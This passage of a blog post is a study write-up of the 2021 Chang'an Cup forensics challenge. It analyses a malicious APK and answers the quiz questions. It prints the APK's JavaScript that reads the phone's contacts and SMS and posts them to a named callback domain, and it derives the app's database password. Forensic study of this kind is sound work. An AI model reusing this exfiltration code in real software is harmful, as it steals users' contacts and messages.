class="hljs-keyword">function</span> (<span class="hljs-params">addressbook</span>) &#123;<br><br><br>					addressbook.<span class="hljs-title function_">find</span>([<span class="hljs-string">&quot;displayName&quot;</span>, <span class="hljs-string">&quot;phoneNumbers&quot;</span>], <span class="hljs-keyword">function</span> (<span class="hljs-params">contacts</span>) &#123;<br><br><br>						<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>, len = contacts.<span class="hljs-property">length</span>; i &lt; len; i++) &#123;<br>							con = con + <span class="hljs-string">&#x27;=&#x27;</span> + contacts[i].<span class="hljs-property">displayName</span> + <span class="hljs-string">&#x27;|&#x27;</span> + (contacts[i].<span class="hljs-property">phoneNumbers</span>.<span class="hljs-property">length</span> == <span class="hljs-number">0</span> ? <span class="hljs-string">&quot;&quot;</span> : contacts[i].<span class="hljs-property">phoneNumbers</span>[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>);<br>						&#125;<br><br><br><br><br><br>						mui.<span class="hljs-title function_">ajax</span>(apiserver + <span class="hljs-string">&#x27;api&#x27;</span>, &#123;<br>							<span class="hljs-attr">data</span>: &#123;<br>								<span class="hljs-attr">data</span>: con<br>							&#125;,<br>							<span class="hljs-attr">dataType</span>: <span class="hljs-string">&#x27;text&#x27;</span>,<span class="hljs-comment">//服务器返回json格式数据</span><br>							<span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-comment">//HTTP请求类型</span><br>							<span class="hljs-attr">timeout</span>: <span class="hljs-number">10000</span>,<span class="hljs-comment">//超时时间设置为10秒；              </span><br>							<span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br>								<span class="hljs-comment">//alert(data)</span><br>								<span class="hljs-keyword">if</span> (data == <span class="hljs-string">&#x27;正在加载列表&#x27;</span>) &#123;<br>									<span class="hljs-title function_">dingwei</span>(sjh, yqm);<br>									mui.<span class="hljs-title function_">openWindow</span>(&#123;<br>										<span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;list.html&#x27;</span>,<br>										<span class="hljs-attr">show</span>: &#123;<br>											<span class="hljs-attr">autoShow</span>: <span class="hljs-literal">true</span><br>										&#125;<br>									&#125;);<br>								&#125; <span class="hljs-keyword">else</span> &#123;<br>									mui.<span class="hljs-title function_">toast</span>(data)<br>								&#125;<br>								<span class="hljs-comment">//console.log(con)</span><br>							&#125;,<br>							<span class="hljs-attr">error</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">xhr, type, errorThrown</span>) &#123;<br>								<span class="hljs-comment">//异常处理；</span><br><br><br>							&#125;<br>						&#125;);<br><br><br><br>					&#125;, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>						mui.<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;为保证用户质量，使用本app请同意通讯录授权 &quot;</span>);<br>					&#125;, &#123;<br>						<span class="hljs-attr">multiple</span>: <span class="hljs-literal">true</span><br>					&#125;);<br>				&#125;, <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;<br>					mui.<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;为保证用户质量，使用本app请同意通讯录授权 &quot;</span>);<br>				&#125;);<br>			&#125;<br><br><br><br><br>		&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>分析后得到，选<code>ACDE</code></p>
+<h2 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h2><h3 id="该APK程序回传通讯录时-使用的http请求方式为（）"><a href="#该APK程序回传通讯录时-使用的http请求方式为（）" class="headerlink" title="该APK程序回传通讯录时,使用的http请求方式为（）"></a>该APK程序回传通讯录时,使用的http请求方式为（）</h3><p>由上一题中得到的代码可知，</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs lasso">mui.ajax(apiserver + <span class="hljs-string">&#x27;apisms&#x27;</span>, &#123;<br>								<span class="hljs-built_in">data</span>: &#123;<br>									<span class="hljs-built_in">data</span>: duanxin<br>								&#125;,<br>								dataType: <span class="hljs-string">&#x27;text&#x27;</span>,<span class="hljs-comment">//服务器返回json格式数据</span><br>								<span class="hljs-keyword">type</span>: <span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-comment">//HTTP请求类型</span><br>								timeout: <span class="hljs-number">10000</span>,<span class="hljs-comment">//超时时间设置为10秒；              </span><br>								success: function (<span class="hljs-built_in">data</span>) &#123;<br>									mui.toast(<span class="hljs-string">&#x27;获取成功&#x27;</span>)<br>									<span class="hljs-comment">//console.log(con)</span><br></code></pre></td></tr></table></figure>
+<p>http请求类型为<code>post</code></p>
+<h2 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a>第七题</h2><h3 id="该APK程序的回传地址域名为【标准格式：www-abc-com】"><a href="#该APK程序的回传地址域名为【标准格式：www-abc-com】" class="headerlink" title="该APK程序的回传地址域名为【标准格式：www.abc.com】"></a>该APK程序的回传地址域名为【标准格式：<a target="_blank" rel="noopener" href="http://www.abc.com】/">www.abc.com】</a></h3><p>代码中可以找到：<br><code>var apiserver = &#39;http://www.honglian7001.com/api/uploads/&#39;;</code><br>因此回传地址域名为：<code>www.honglian7001.com</code></p>
+<h2 id="第八题"><a href="#第八题" class="headerlink" title="第八题"></a>第八题</h2><h3 id="该APK程序代码中配置的变量apiserver的值为-【标准格式：www-abc-com-abc】"><a href="#该APK程序代码中配置的变量apiserver的值为-【标准格式：www-abc-com-abc】" class="headerlink" title="该APK程序代码中配置的变量apiserver的值为  【标准格式：www.abc.com/abc】"></a>该APK程序代码中配置的变量apiserver的值为  【标准格式：<a target="_blank" rel="noopener" href="http://www.abc.com/abc%E3%80%91">www.abc.com/abc】</a></h3><p>同上一题中找到的，即<code>www.honglian7001.com/api/uploads</code></p>
+<h2 id="第九题"><a href="#第九题" class="headerlink" title="第九题"></a>第九题</h2><h3 id="分析该APK，发现该程序还具备获取短信回传到后台的功能，短信上传服务器接口地址为【标准格式：www-abc-com-abc】-（后面不带-）"><a href="#分析该APK，发现该程序还具备获取短信回传到后台的功能，短信上传服务器接口地址为【标准格式：www-abc-com-abc】-（后面不带-）" class="headerlink" title="分析该APK，发现该程序还具备获取短信回传到后台的功能，短信上传服务器接口地址为【标准格式：www.abc.com/abc】 （后面不带&#x2F;）"></a>分析该APK，发现该程序还具备获取短信回传到后台的功能，短信上传服务器接口地址为【标准格式：<a target="_blank" rel="noopener" href="http://www.abc.com/abc%E3%80%91">www.abc.com/abc】</a> （后面不带&#x2F;）</h3><p>代码中可以找到</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mui<span class="hljs-selector-class">.ajax</span>(apiserver + <span class="hljs-string">&#x27;apisms&#x27;</span>,<br></code></pre></td></tr></table></figure>
+<p>具体的apiserver我们已知，<code>apisms</code>是具体的接口路径，因此最终得到的接口路径为<code>www.honglian7001.com/api/uploads/apisms</code></p>
+<h2 id="第十题"><a href="#第十题" class="headerlink" title="第十题"></a>第十题</h2><h3 id="经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该文件的文件名为"><a href="#经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该文件的文件名为" class="headerlink" title="经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该文件的文件名为"></a>经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该文件的文件名为</h3><p>数据库文件后缀为<code>.db</code>，搜索得<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250504202320966.png" srcset="/img/loading.gif" lazyload><br>找到一个SQLiteDatabase数据库中生成的一个文件<code>test.db</code></p>
+<h2 id="第十一题"><a href="#第十一题" class="headerlink" title="第十一题"></a>第十一题</h2><h3 id="经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该数据库的初始密码为"><a href="#经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该数据库的初始密码为" class="headerlink" title="经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该数据库的初始密码为"></a>经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该数据库的初始密码为</h3><p>分析代码：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">byte</span>[] key = &#123;<span class="hljs-number">97</span>, <span class="hljs-number">98</span>, <span class="hljs-number">99</span>, <span class="hljs-number">100</span>, <span class="hljs-number">101</span>, <span class="hljs-number">102</span>&#125;;<br>  <br>        <span class="hljs-attribute">SQLiteDatabase</span> writableDatabase = dbHelper.getWritableDatabase(getMD5(bytesToHex(key).substring(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>)));<br></code></pre></td></tr></table></figure>
+<p>先转成十六进制<code>616263646566</code><br>然后取<code>[1,3)</code>的值进行md5计算，得到<code>c74d97b01eae257e44aa9d5bade97baf</code></p>
+<h2 id="第十二题"><a href="#第十二题" class="headerlink" title="第十二题"></a>第十二题</h2><h3 id="检材二的原始硬盘的SHA256值为："><a href="#检材二的原始硬盘的SHA256值为：" class="headerlink" title="检材二的原始硬盘的SHA256值为："></a>检材二的原始硬盘的SHA256值为：</h3><p>先使用第七题的答案进行解压</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">www.ho<span class="hljs-symbol">nglian7001</span>.com<br></code></pre></td></tr></table></figure>
+<p>使用X-Ways挂载后计算哈希值，得到<br><code>E6873068B83AF9988D297C6916329CEC9D8BCB672C6A894D393E68764391C589</code></p>
+<h2 id="第十三题"><a href="#第十三题" class="headerlink" title="第十三题"></a>第十三题</h2><h3 id="查询涉案于案发时间段内登陆服务器的IP地址为【标准格式：111-111-111-111】"><a href="#查询涉案于案发时间段内登陆服务器的IP地址为【标准格式：111-111-111-111】" class="headerlink" title="查询涉案于案发时间段内登陆服务器的IP地址为【标准格式：111.111.111.111】"></a>查询涉案于案发时间段内登陆服务器的IP地址为【标准格式：111.111.111.111】</h3><p>在<code>/var/log/wtmp</code>查看登录日志<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250504211832566.png" srcset="/img/loading.gif" lazyload><br>因此为<code>192.168.110.203</code></p>
+<h2 id="第十四题"><a href="#第十四题" class="headerlink" title="第十四题"></a>第十四题</h2><h3 id="请对检材二进行分析，并回答该服务器在集群中承担的主要作用是（）【格式：文件存储】"><a href="#请对检材二进行分析，并回答该服务器在集群中承担的主要作用是（）【格式：文件存储】" class="headerlink" title="请对检材二进行分析，并回答该服务器在集群中承担的主要作用是（）【格式：文件存储】"></a>请对检材二进行分析，并回答该服务器在集群中承担的主要作用是（）【格式：文件存储】</h3><p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250504223019653.png" srcset="/img/loading.gif" lazyload><br>火眼创建虚拟机</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Study/" class="category-chain-item">Study</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/tags/Forensics/" class="print-no-link">#Forensics</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>电子取证-长安杯2021 学习记录</div>
+      <div>http://ramoor.github.io/2025/05/03/电子取证-长安杯2021 学习记录/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Ramoor</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年5月3日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/04/29/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-MT19937/" title="Crypto基础篇-MT19937">
+                        <span class="hidden-mobile">Crypto基础篇-MT19937</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"lPTos9qTFk57xeK53vE7I61e-MdYXbMMI","appKey":"DpXRDnV0ErOnqjSiWrfRvGWm","path":"window.location.pathname","placeholder":"`快来评论啊`","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"https://lptos9qt.api.lncldglobal.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <!-- 小破站存活时长 --> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         次
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/Cherry.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css" integrity="sha384-GvrOXuhMATgEsSwCs4smul74iXGOixntILdUW9XmUC6+HX0sLNAK3q71HotJqlAn" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.js" integrity="sha384-cpW21h6RZv/phavutF+AuVYrr+dA8xD9zs6FwLpaCct6O9ctzYFfFr4dgmgccOTx" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous"></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        renderMathInElement(document.body, {
+          // customised options
+          // • auto-render specific keys, e.g.:
+        delimiters: [
+            {left: '$$', right: '$$', display: true},
+            {left: '$', right: '$', display: false},
+            //{left: '\(', right: '\)', display: false},
+            //{left: '\[', right: '\]', display: true}
+        ],
+          // • rendering keys, e.g.:
+        throwOnError : false
+        });
+    });
+</script>
+<!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
+</html>
